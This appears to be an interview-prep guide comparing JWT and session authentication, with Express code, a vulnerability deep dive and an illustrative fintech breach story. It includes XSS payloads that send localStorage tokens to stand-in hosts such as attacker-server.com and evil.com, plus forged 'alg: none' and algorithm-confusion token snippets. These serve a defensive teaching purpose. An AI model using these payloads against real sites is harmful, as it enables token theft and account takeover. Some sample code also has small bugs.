# JWT vs Session Authentication

> **Focus**: Understanding token-based vs session-based authentication security trade-offs

---

## Question 1: What are the security differences between JWT and Session-based authentication?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 10 minutes
**Companies:** Google, Meta, Amazon, Netflix, Uber, Stripe

### Question
Compare JWT and session-based authentication, their security implications, and when to use each approach.

### Answer

**JWT (JSON Web Token)** and **Session-based** authentication are two fundamentally different approaches to maintaining user authentication state in web applications.

**Key Differences:**

**1. Session-Based Authentication (Stateful)**
- Server stores session data in memory/database
- Client receives session ID in cookie
- Server validates session ID on each request
- Session data stored server-side

**2. JWT Authentication (Stateless)**
- Server signs a token containing user data
- Client stores token (localStorage, cookie, memory)
- Server validates token signature on each request
- No server-side session storage needed

**Security Comparison:**

| **Aspect** | **JWT** | **Session** |
|-----------|---------|-------------|
| **Storage** | Client-side | Server-side |
| **Revocation** | Difficult | Easy |
| **Size** | Larger (1-2 KB) | Smaller (session ID ~32 bytes) |
| **Scalability** | Horizontal scaling easier | Requires session store |
| **XSS Risk** | High (if in localStorage) | Lower (httpOnly cookies) |
| **CSRF Risk** | Lower (if in headers) | Higher (if in cookies) |

### Code Example

```javascript
// ============================================
// 1. SESSION-BASED AUTHENTICATION
// ============================================

// Express.js with express-session
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const redisClient = redis.createClient({
  host: 'localhost',
  port: 6379
});

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Strong random secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,        // HTTPS only
    httpOnly: true,      // ✅ Prevents XSS access
    maxAge: 1000 * 60 * 60 * 24, // 24 hours
    sameSite: 'strict'   // ✅ CSRF protection
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Validate credentials
  const user = await User.findOne({ email });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // ✅ Create session (stored in Redis)
  req.session.userId = user.id;
  req.session.role = user.role;

  res.json({ success: true, user: { id: user.id, email: user.email } });
});

// Protected route
app.get('/api/profile', (req, res) => {
  // ✅ Session automatically validated by middleware
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  const user = await User.findById(req.session.userId);
  res.json(user);
});

// Logout endpoint
app.post('/logout', (req, res) => {
  // ✅ Easy to revoke - destroy session
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid'); // Clear session cookie
    res.json({ success: true });
  });
});

// ============================================
// 2. JWT AUTHENTICATION (Stateless)
// ============================================

const jwt = require('jsonwebtoken');

// Login endpoint
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // ✅ Create JWT token
  const accessToken = jwt.sign(
    {
      userId: user.id,
      email: user.email,
      role: user.role
    },
    process.env.JWT_SECRET,
    {
      expiresIn: '15m',        // Short-lived access token
      issuer: 'myapp.com',
      audience: 'myapp.com'
    }
  );

  // ✅ Create refresh token (longer-lived)
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // Store refresh token in database for revocation
  await RefreshToken.create({
    token: refreshToken,
    userId: user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  // ✅ Send tokens in httpOnly cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000 // 15 minutes
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });

  res.json({ success: true, user: { id: user.id, email: user.email } });
});

// JWT verification middleware
const authenticateJWT = (req, res, next) => {
  const token = req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    // ✅ Verify token signature and expiration
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'myapp.com',
      audience: 'myapp.com'
    });

    req.user = decoded;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(403).json({ error: 'Invalid token' });
  }
};

// Protected route
app.get('/api/profile', authenticateJWT, async (req, res) => {
  const user = await User.findById(req.user.userId);
  res.json(user);
});

// Refresh token endpoint
app.post('/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);

    // Check if refresh token exists in database (not revoked)
    const storedToken = await RefreshToken.findOne({
      token: refreshToken,
      userId: decoded.userId
    });

    if (!storedToken) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }

    // Generate new access token
    const user = await User.findById(decoded.userId);
    const accessToken = jwt.sign(
      { userId: user.id, email: user.email, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    res.cookie('accessToken', accessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });

    res.json({ success: true });
  } catch (err) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// Logout endpoint
app.post('/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    // ✅ Revoke refresh token
    await RefreshToken.deleteOne({ token: refreshToken });
  }

  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  res.json({ success: true });
});

// ============================================
// 3. JWT STORAGE COMPARISON
// ============================================

// ❌ BAD: localStorage (vulnerable to XSS)
// If attacker injects script, they can steal token
localStorage.setItem('token', accessToken);
const token = localStorage.getItem('token');

fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// ⚠️ OKAY: sessionStorage (slightly better, but still XSS risk)
sessionStorage.setItem('token', accessToken);

// ✅ GOOD: httpOnly cookies (immune to XSS)
// Server sets cookie, JavaScript cannot access it
res.cookie('accessToken', accessToken, {
  httpOnly: true,  // ✅ Cannot be accessed by JavaScript
  secure: true,
  sameSite: 'strict'
});

// ✅ BEST: Memory (most secure, but lost on page reload)
// Store in React context/Redux, never in localStorage
let tokenStore = null;

function setToken(token) {
  tokenStore = token;
}

function getToken() {
  return tokenStore;
}

// ============================================
// 4. TOKEN REVOCATION STRATEGIES
// ============================================

// Strategy 1: Token Blacklist (not scalable)
const tokenBlacklist = new Set();

app.post('/logout', (req, res) => {
  const token = req.cookies.accessToken;
  // ❌ Add to blacklist (grows infinitely)
  tokenBlacklist.add(token);
  res.json({ success: true });
});

const authenticateJWT = (req, res, next) => {
  const token = req.cookies.accessToken;
  // Check blacklist on every request (slow)
  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  // Verify token...
};

// Strategy 2: Short-lived tokens + Refresh tokens (✅ Recommended)
// Access token: 15 minutes (short, can't revoke but expires quickly)
// Refresh token: 7 days (stored in DB, can revoke)

const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

// Store refresh token in database
await RefreshToken.create({ token: refreshToken, userId: user.id });

// To revoke: delete refresh token from database
await RefreshToken.deleteOne({ token: refreshToken });

// Strategy 3: Token versioning
// Include version in JWT payload
const token = jwt.sign(
  { userId: user.id, tokenVersion: user.tokenVersion },
  secret
);

// Invalidate all tokens by incrementing version
await User.updateOne(
  { _id: userId },
  { $inc: { tokenVersion: 1 } }
);

// Verify token version matches
const decoded = jwt.verify(token, secret);
const user = await User.findById(decoded.userId);
if (decoded.tokenVersion !== user.tokenVersion) {
  throw new Error('Token revoked');
}

// ============================================
// 5. SECURE JWT IMPLEMENTATION CHECKLIST
// ============================================

function createSecureJWT(user) {
  return jwt.sign(
    {
      // ✅ Include minimal data (no sensitive info)
      userId: user.id,
      role: user.role,
      // ❌ DON'T include: password, SSN, credit cards

      // ✅ Include security claims
      iat: Math.floor(Date.now() / 1000), // Issued at
      jti: crypto.randomBytes(16).toString('hex') // JWT ID (prevent replay)
    },
    process.env.JWT_SECRET, // ✅ Strong secret (256-bit minimum)
    {
      algorithm: 'HS256',    // ✅ Use HS256 or RS256
      expiresIn: '15m',      // ✅ Short expiration
      issuer: 'myapp.com',   // ✅ Verify issuer
      audience: 'myapp.com'  // ✅ Verify audience
    }
  );
}

// ✅ Verify JWT securely
function verifySecureJWT(token) {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'], // ✅ Whitelist algorithm (prevent 'none' attack)
      issuer: 'myapp.com',
      audience: 'myapp.com',
      maxAge: '15m'          // ✅ Double-check expiration
    });

    // ✅ Additional validation
    if (!decoded.userId || !decoded.role) {
      throw new Error('Invalid token payload');
    }

    return decoded;
  } catch (err) {
    // ✅ Log security events
    logger.warn('JWT_VERIFICATION_FAILED', { error: err.message });
    throw err;
  }
}
```

<details>
<summary><strong>🔍 Deep Dive: JWT Security Internals and Vulnerabilities</strong></summary>

**JWT Structure and Cryptographic Verification:**

A JWT consists of three Base64URL-encoded parts separated by dots: Header.Payload.Signature. Understanding this structure is critical for security.

**1. JWT Composition Deep Dive:**

The header typically contains `{"alg": "HS256", "typ": "JWT"}`, which specifies the signing algorithm. The payload contains claims (user data, expiration, issuer). The signature is computed as: `HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)`.

The signature verification process involves:
1. Split JWT into three parts using '.' delimiter
2. Decode header and extract algorithm
3. Verify algorithm is in whitelist (critical security check)
4. Recompute signature using the same algorithm and secret
5. Compare computed signature with provided signature using constant-time comparison
6. Parse payload and verify claims (exp, iat, nbf, iss, aud)

**2. The 'none' Algorithm Attack:**

One of the most critical JWT vulnerabilities is the algorithm confusion attack. If a server doesn't properly validate the algorithm, an attacker can create a token with `"alg": "none"` and no signature:

```javascript
// Vulnerable server code
const decoded = jwt.decode(token); // ❌ Only decodes, doesn't verify
if (decoded.userId) {
  req.user = decoded;
}

// Attacker creates token with "alg": "none"
const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));
const payload = btoa(JSON.stringify({ userId: 1, role: 'admin' }));
const maliciousToken = `${header}.${payload}.`;
// No signature, but server accepts it!
```

**Protection**: Always use `jwt.verify()` with algorithm whitelist:
```javascript
jwt.verify(token, secret, { algorithms: ['HS256'] }); // ✅ Safe
```

**3. Algorithm Confusion: HS256 vs RS256:**

HS256 uses symmetric encryption (same secret for signing and verification). RS256 uses asymmetric encryption (private key signs, public key verifies). A dangerous vulnerability occurs when:

1. Server expects RS256 (public key verification)
2. Attacker changes header to HS256
3. Attacker signs token using the public key as HMAC secret
4. Server verifies using public key as HMAC secret → succeeds!

Example vulnerable code:
```javascript
// Server has public key: "-----BEGIN PUBLIC KEY-----\nMIIBIj..."
const publicKey = fs.readFileSync('public.key');

// ❌ Doesn't specify algorithm
const decoded = jwt.verify(token, publicKey);

// Attacker changes alg to HS256 and signs with public key
const maliciousToken = jwt.sign(
  { userId: 1, role: 'admin' },
  publicKey, // Using public key as HMAC secret!
  { algorithm: 'HS256' }
);
```

**Protection**: Specify algorithms explicitly:
```javascript
jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // ✅ Safe
```

**4. JWT Expiration and Clock Skew:**

JWT expiration is based on the `exp` claim (Unix timestamp). Vulnerable implementations:

```javascript
// ❌ Manual expiration check (vulnerable to clock skew)
const decoded = jwt.decode(token);
if (decoded.exp < Date.now() / 1000) {
  throw new Error('Token expired');
}
```

Issues:
- No signature verification
- Doesn't account for clock skew between servers
- Race condition if system time changes

**Proper implementation:**
```javascript
// ✅ jwt.verify handles expiration + clock skew
const decoded = jwt.verify(token, secret, {
  clockTolerance: 5 // Allow 5 seconds clock skew
});
```

**5. Token Storage Security Analysis:**

**localStorage (Most Vulnerable):**
- Persists across sessions
- Accessible by any JavaScript code on same origin
- XSS attack steals token: `fetch('https://attacker.com', { method: 'POST', body: localStorage.getItem('token') })`
- No protection against XSS

**sessionStorage (Slightly Better):**
- Cleared when tab closes
- Still vulnerable to XSS
- No protection if user keeps tab open

**httpOnly Cookies (Recommended):**
- Cannot be accessed by JavaScript (`document.cookie` returns empty)
- Immune to XSS token theft
- Vulnerable to CSRF (mitigated with SameSite and CSRF tokens)
- Automatically sent with requests

**Memory Storage (Most Secure):**
- Not persisted anywhere
- Cleared on page reload
- XSS can still access if attacker reads from memory during session
- Requires refresh token mechanism

**6. Refresh Token Rotation:**

Advanced security pattern to prevent refresh token theft:

```javascript
// Refresh token rotation pattern
app.post('/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;

  // Verify old refresh token
  const decoded = jwt.verify(oldRefreshToken, refreshSecret);

  // Check if token was already used (rotation detection)
  const storedToken = await RefreshToken.findOne({
    token: oldRefreshToken,
    userId: decoded.userId
  });

  if (!storedToken) {
    // Token was already used or revoked
    // Possible token theft - revoke all user tokens
    await RefreshToken.deleteMany({ userId: decoded.userId });
    return res.status(403).json({ error: 'Token reuse detected' });
  }

  // Delete old refresh token
  await RefreshToken.deleteOne({ token: oldRefreshToken });

  // Generate new access token and refresh token
  const newAccessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
  const newRefreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

  // Store new refresh token
  await RefreshToken.create({
    token: newRefreshToken,
    userId: decoded.userId,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  // Return new tokens
  res.cookie('accessToken', newAccessToken, { httpOnly: true, ... });
  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, ... });
});
```

This prevents:
- Refresh token reuse (each token is single-use)
- Token theft detection (reuse triggers revocation of all tokens)
- Long-term compromise

**7. JWT vs Session Performance:**

**Memory Usage Comparison:**

Session-based (100,000 active sessions):
- Session ID: 32 bytes × 100,000 = 3.2 MB
- Session data (average 500 bytes): 500 × 100,000 = 50 MB
- Total server memory: ~53 MB
- Redis storage: Minimal memory overhead

JWT-based (100,000 active users):
- Server memory: 0 bytes (stateless)
- Client storage: 1-2 KB per user
- Network overhead: 1-2 KB per request (in headers)
- CPU cost: HMAC/RSA verification per request (~0.01ms)

**Scalability:**

Sessions require:
- Sticky sessions (route same user to same server)
- Or shared session store (Redis, Memcached)
- Session replication across servers

JWTs enable:
- Any server can verify any token
- No session store needed
- Perfect for microservices
- But: harder to revoke, larger request size

**8. Timing Attack Vulnerabilities:**

Constant-time comparison is critical for signature verification:

```javascript
// ❌ Vulnerable to timing attacks
function verifySignature(expected, actual) {
  if (expected === actual) return true;
  // Comparison stops at first different character
  // Attacker measures response time to guess signature
}

// ✅ Constant-time comparison
const crypto = require('crypto');
function verifySignature(expected, actual) {
  return crypto.timingSafeEqual(
    Buffer.from(expected),
    Buffer.from(actual)
  );
  // Always compares all bytes, regardless of differences
}
```

Modern JWT libraries use constant-time comparison internally, but custom implementations must be careful.

</details>

<details>
<summary><strong>🐛 Real-World Scenario: JWT Token Theft at Fintech Startup</strong></summary>

**Context:**

PayFlow, a fintech startup processing $500M annually in payments, used JWT authentication for their web dashboard where businesses managed transactions. They stored JWTs in localStorage and had 45,000 active business accounts accessing the platform daily.

**Problem:**

On March 15th, 2024, the security team detected unusual activity:

1. **Unauthorized Transactions**: 287 accounts initiated wire transfers they didn't authorize
2. **Account Takeovers**: Attackers accessed sensitive financial data from compromised accounts
3. **Financial Impact**: $2.3M in fraudulent transactions before detection
4. **Scope**: 287 affected businesses, 12% of daily active users

**Metrics Before Incident:**

- **Authentication Method**: JWT in localStorage
- **Token Expiration**: 24 hours (too long)
- **Refresh Token**: None (users logged in once per day)
- **XSS Protection**: None (no CSP policy)
- **Security Monitoring**: Basic logging only

**Root Cause:**

A critical XSS vulnerability in the transaction notes field allowed attackers to inject malicious scripts:

```javascript
// Vulnerable code in transaction notes rendering
function renderTransactionNote(note) {
  // ❌ Direct innerHTML injection without sanitization
  document.getElementById('note').innerHTML = note;
}

// Attacker submitted transaction note:
const maliciousNote = `
  <img src=x onerror="
    const token = localStorage.getItem('jwt_token');
    fetch('https://attacker-server.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        token: token,
        user: document.querySelector('.user-email').textContent
      })
    });
  ">
  Thank you for your payment!
`;

// When victim views transaction, script executes and steals JWT
```

**Attack Timeline:**

- **Day 1 (March 15, 08:00)**: Attacker discovers XSS vulnerability
- **Day 1 (10:00)**: Attacker creates legitimate account and submits transactions with XSS payload
- **Day 1 (12:00-18:00)**: 287 businesses view malicious transaction notes, tokens stolen
- **Day 1 (19:00)**: Attacker begins using stolen tokens to initiate wire transfers
- **Day 2 (March 16, 03:00)**: Automated fraud detection flags unusual transfer patterns
- **Day 2 (06:00)**: Security team investigates, discovers XSS + token theft
- **Day 2 (07:00)**: Emergency response initiated

**Debugging Process:**

**Step 1: Incident Detection** (Hour 0-1)

Automated fraud detection system flagged:
```javascript
// Fraud detection alert
{
  "alert": "UNUSUAL_TRANSFER_PATTERN",
  "details": {
    "affectedAccounts": 287,
    "totalAmount": "$2,345,678",
    "pattern": "Multiple accounts transferring to same destination",
    "timeRange": "2024-03-15 19:00 - 2024-03-16 03:00"
  }
}
```

**Step 2: Log Analysis** (Hour 1-2)

Security team analyzed access logs:
```javascript
// Suspicious pattern found
{
  "userId": "user_12345",
  "ip": "185.220.101.xxx", // Different from user's normal IP
  "location": "Eastern Europe", // User normally in US
  "userAgent": "curl/7.68.0", // Programmatic access, not browser
  "endpoint": "/api/transfer",
  "token": "eyJhbGciOiJIUzI1NiIs..." // Valid JWT
}

// 287 different users, all with:
// - Different IPs than normal
// - Programmatic user agents
// - Valid JWTs (not expired!)
```

**Step 3: Token Validation** (Hour 2-3)

Verified stolen tokens were legitimate:
```javascript
// All tokens were valid
const decoded = jwt.verify(stolenToken, JWT_SECRET);
// {
//   userId: 'user_12345',
//   email: 'victim@business.com',
//   iat: 1710489600, // March 15, 08:00
//   exp: 1710576000  // March 16, 08:00 (24hr expiration)
// }

// Problem: No way to revoke JWTs without database!
```

**Step 4: XSS Discovery** (Hour 3-4)

Found malicious transaction notes:
```javascript
// Query database for suspicious notes
db.transactions.find({
  note: { $regex: /<script|onerror|localStorage/i }
});

// Found 23 transactions with XSS payloads
// All created by attacker account between 10:00-12:00
```

**Immediate Response Actions:**

**Hour 4-5: Emergency Mitigations**

1. **Invalidate All Tokens** (Nuclear Option)
```javascript
// ❌ Problem: No token revocation mechanism!
// Temporary solution: Change JWT secret (invalidates all tokens)
process.env.JWT_SECRET = crypto.randomBytes(64).toString('hex');

// Forces all users to re-login
// Blocks attacker, but also disrupts 45,000 legitimate users
```

2. **Block Attacker IPs**
```javascript
// WAF rules to block attacker IP ranges
const suspiciousIPs = [
  '185.220.101.0/24',
  '185.220.102.0/24',
  // 47 IP addresses identified
];

// Block at CloudFlare level
```

3. **Sanitize Malicious Content**
```javascript
// Remove XSS payloads from transaction notes
db.transactions.updateMany(
  { note: { $regex: /<script|onerror|on\w+=/i } },
  { $set: { note: '[Content removed for security]' } }
);
// Sanitized 23 malicious notes
```

**Long-Term Solution Implementation (Week 1-2):**

**Fix 1: Move JWT to httpOnly Cookies**

Before (Vulnerable):
```javascript
// ❌ Client-side storage
localStorage.setItem('jwt_token', token);

// Send token in Authorization header
fetch('/api/transfer', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('jwt_token')}`
  }
});
```

After (Secure):
```javascript
// ✅ Server sets httpOnly cookie
res.cookie('accessToken', token, {
  httpOnly: true,  // JavaScript cannot access
  secure: true,    // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 15 * 60 * 1000 // 15 minutes
});

// Client makes request (cookie sent automatically)
fetch('/api/transfer', {
  credentials: 'include' // Send cookies
});
// JavaScript never touches the token!
```

**Fix 2: Implement Refresh Token System**

```javascript
// Short-lived access token (15 min) + long-lived refresh token (7 days)
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body);

  // Access token: 15 minutes (can't revoke, but expires quickly)
  const accessToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  // Refresh token: 7 days (stored in DB, can revoke)
  const refreshToken = jwt.sign(
    { userId: user.id, tokenId: crypto.randomUUID() },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // Store refresh token in database
  await RefreshToken.create({
    tokenId: decoded.tokenId,
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    createdAt: new Date(),
    lastUsed: new Date()
  });

  res.cookie('accessToken', accessToken, { httpOnly: true, maxAge: 15 * 60 * 1000 });
  res.cookie('refreshToken', refreshToken, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
});

// Revoke all tokens for affected users
await RefreshToken.deleteMany({
  userId: { $in: affectedUserIds }
});
// Forces re-login, but only for affected users
```

**Fix 3: Implement XSS Protection**

```javascript
// Install DOMPurify for sanitization
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Sanitize all user input
function renderTransactionNote(note) {
  // ✅ Sanitize before rendering
  const clean = DOMPurify.sanitize(note, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  document.getElementById('note').innerHTML = clean;
}

// Add Content Security Policy
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-" + req.nonce + "'; " +
    "object-src 'none';"
  );
  next();
});
```

**Fix 4: Enhanced Security Monitoring**

```javascript
// Monitor for suspicious access patterns
function detectAnomalousAccess(userId, request) {
  const user = await User.findById(userId);
  const recentLogins = await LoginHistory.find({ userId }).limit(10);

  // Check for anomalies
  const anomalies = [];

  // IP address change
  if (!recentLogins.some(l => l.ip === request.ip)) {
    anomalies.push('NEW_IP');
  }

  // Geolocation change
  if (geoDistance(user.lastLocation, request.location) > 500) { // 500km
    anomalies.push('LOCATION_CHANGE');
  }

  // User agent change
  if (user.lastUserAgent !== request.userAgent) {
    anomalies.push('DEVICE_CHANGE');
  }

  // Time-of-day anomaly
  if (!isTypicalAccessTime(userId, request.timestamp)) {
    anomalies.push('UNUSUAL_TIME');
  }

  if (anomalies.length >= 2) {
    // Require step-up authentication
    return { requireMFA: true, anomalies };
  }
}
```

**Results After Fix:**

- **Token Storage**: httpOnly cookies (immune to XSS theft)
- **Token Expiration**: 15 minutes access + 7 day refresh
- **Token Revocation**: Enabled (refresh tokens in database)
- **XSS Protection**: DOMPurify + CSP (blocks injection)
- **Security Monitoring**: Real-time anomaly detection
- **Incident Response Time**: <30 minutes (from 9 hours)
- **Fraud Losses**: $0 (down from $2.3M)
- **User Disruption**: Only affected users (not all 45K)

**Financial Impact:**

- **Direct Losses**: $2.3M in fraudulent transactions
- **Refunds**: $2.3M refunded to affected businesses
- **Legal Costs**: $450K in legal fees
- **Security Audit**: $125K for third-party security review
- **Engineering Time**: 800 hours ($120K) for fixes
- **Customer Churn**: 34 businesses closed accounts ($680K ARR lost)
- **Total Cost**: ~$6M

**Prevention Strategies:**

1. **Never Store JWTs in localStorage**
   - Use httpOnly cookies instead
   - Or use memory storage with refresh mechanism

2. **Short Token Expiration**
   - Access tokens: 15 minutes or less
   - Refresh tokens: 7 days maximum

3. **Implement Token Revocation**
   - Store refresh tokens in database
   - Allow immediate revocation

4. **XSS Prevention**
   - Sanitize all user input (DOMPurify)
   - Implement strict CSP
   - Use textContent instead of innerHTML

5. **Security Monitoring**
   - Log all authentication events
   - Detect anomalous access patterns
   - Alert on suspicious activity

6. **Regular Security Audits**
   - Quarterly penetration testing
   - Automated vulnerability scanning
   - Bug bounty program

</details>

<details>
<summary><strong>⚖️ Trade-offs: JWT vs Session Authentication</strong></summary>

**Decision Matrix:**

| **Factor** | **Session-Based** | **JWT** | **Winner** |
|-----------|------------------|---------|------------|
| **Scalability** | Requires session store | Stateless | JWT |
| **Revocation** | Instant | Difficult | Session |
| **Network Overhead** | 32 bytes (session ID) | 1-2 KB (token) | Session |
| **XSS Protection** | httpOnly cookie | Depends on storage | Session |
| **CSRF Protection** | Requires CSRF token | Not needed (if header) | JWT |
| **Server Load** | Session lookup | Crypto verification | Tie |
| **Mobile Apps** | Cookie handling complex | Easy (headers) | JWT |
| **Microservices** | Shared session store | Any service verifies | JWT |

**1. Scalability Comparison:**

**Session-Based (Requires Centralized Store):**

```javascript
// ✅ GOOD: Sessions with Redis
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({
    client: redisClient,
    ttl: 86400 // 24 hours
  }),
  secret: process.env.SESSION_SECRET
}));

// Pros:
// - Fast session lookup (Redis O(1))
// - Instant revocation (delete from Redis)
// - Small cookie size (session ID only)

// Cons:
// - Single point of failure (if Redis goes down)
// - Network latency to Redis (1-5ms per request)
// - Horizontal scaling requires Redis cluster
// - Session affinity needed (sticky sessions) or session replication
```

**JWT (Stateless, No Central Store):**

```javascript
// ✅ GOOD: Stateless JWT
app.get('/api/data', (req, res) => {
  // No database lookup needed
  const decoded = jwt.verify(req.cookies.accessToken, JWT_SECRET);
  // User data in token, use immediately
  res.json({ userId: decoded.userId });
});

// Pros:
// - No session store needed
// - Any server can handle any request
// - Perfect for microservices
// - No session lookup latency

// Cons:
// - Token revocation requires workarounds
// - Larger cookie/header size (1-2 KB)
// - If token stolen, valid until expiration
```

**Scaling Numbers:**

| **Metric** | **Session (Redis)** | **JWT (Stateless)** |
|-----------|-------------------|-------------------|
| **Requests/sec** | 10,000 (Redis bottleneck) | 50,000+ (no DB lookup) |
| **Latency** | +1-5ms (Redis lookup) | +0.1ms (crypto verify) |
| **Memory (100K users)** | 50 MB (Redis) | 0 MB (stateless) |
| **Horizontal Scaling** | Requires Redis cluster | Effortless |

**2. Revocation Speed:**

**Session-Based (Instant Revocation):**

```javascript
// ✅ Instant revocation
app.post('/logout', (req, res) => {
  req.session.destroy(); // Deleted from Redis immediately
  // Next request: session not found → 401 Unauthorized
});

// ✅ Revoke all user sessions (security breach)
app.post('/admin/revoke-all-sessions/:userId', async (req, res) => {
  const { userId } = req.params;
  // Delete all sessions for user
  const keys = await redisClient.keys(`sess:${userId}:*`);
  await redisClient.del(keys);
  // All user sessions invalid immediately
});

// ⏱️ Revocation time: <10ms
```

**JWT (Difficult Revocation):**

```javascript
// ❌ Problem: Can't revoke JWTs without database
app.post('/logout', (req, res) => {
  res.clearCookie('accessToken');
  // But token is still valid if attacker has it!
  // Valid until expiration (15 min)
});

// Workaround 1: Token blacklist (not scalable)
const tokenBlacklist = new Set();

app.post('/logout', (req, res) => {
  const token = req.cookies.accessToken;
  tokenBlacklist.add(token); // Grows infinitely
});

const authenticateJWT = (req, res, next) => {
  const token = req.cookies.accessToken;
  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  // Check on every request (slow)
};

// Workaround 2: Short expiration + refresh tokens (✅ Recommended)
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' }); // Short-lived
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

// Store refresh token in DB (can revoke)
await RefreshToken.create({ token: refreshToken, userId: user.id });

// To revoke: delete refresh token
await RefreshToken.deleteOne({ token: refreshToken });
// Access token still valid for 15 min, but can't get new one

// ⏱️ Revocation time: Up to 15 minutes (access token expiration)
```

**3. Security Trade-offs:**

**XSS Attack Surface:**

```javascript
// Session with httpOnly cookie
// ✅ Immune to XSS token theft
res.cookie('sessionId', sessionId, {
  httpOnly: true, // JavaScript cannot access
  secure: true,
  sameSite: 'strict'
});

// JWT in localStorage
// ❌ Vulnerable to XSS
localStorage.setItem('jwt', token);
// Attacker: fetch('https://evil.com', { body: localStorage.getItem('jwt') })

// JWT in httpOnly cookie
// ✅ Immune to XSS (same protection as session)
res.cookie('accessToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

**CSRF Attack Surface:**

```javascript
// Session with cookies
// ❌ Vulnerable to CSRF (cookies sent automatically)
fetch('https://bank.com/transfer', {
  method: 'POST',
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
  // Cookie sent automatically, even from evil.com!
});

// Mitigation: CSRF token required
const csrfToken = req.csrfToken();
res.cookie('csrf-token', csrfToken);

// Client includes CSRF token in header
fetch('/transfer', {
  headers: {
    'X-CSRF-Token': getCookie('csrf-token')
  }
});

// JWT in Authorization header
// ✅ Not vulnerable to CSRF (header not sent automatically)
fetch('/transfer', {
  headers: {
    'Authorization': `Bearer ${token}` // Must be explicitly set
  }
});

// JWT in cookie
// ❌ Vulnerable to CSRF (same as session)
// Needs SameSite=strict or CSRF token
```

**4. Mobile App Considerations:**

**Session (Cookie Handling is Complex):**

```javascript
// ❌ Mobile apps don't handle cookies well
// React Native example
fetch('https://api.example.com/login', {
  method: 'POST',
  body: JSON.stringify({ email, password }),
  credentials: 'include' // Try to use cookies
});
// Problem:
// - Cookie jar not automatically managed
// - httpOnly cookies not accessible
// - Different behavior iOS vs Android
```

**JWT (Simple Header-based Auth):**

```javascript
// ✅ Simple and consistent across platforms
// React Native example
const token = await SecureStore.getItemAsync('jwt_token');

fetch('https://api.example.com/profile', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Pros:
// - Same API for web and mobile
// - Full control over token storage
// - Use device secure storage (Keychain/Keystore)
